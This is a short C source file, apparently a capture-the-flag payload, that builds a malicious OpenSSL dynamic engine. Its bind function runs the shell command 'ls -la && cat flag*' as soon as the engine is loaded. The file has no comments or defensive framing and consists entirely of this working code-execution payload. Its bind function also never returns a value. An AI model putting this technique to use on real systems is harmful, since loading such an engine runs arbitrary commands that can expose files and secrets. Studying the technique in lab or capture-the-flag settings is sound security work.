#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
    system("ls -la && cat flag*");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
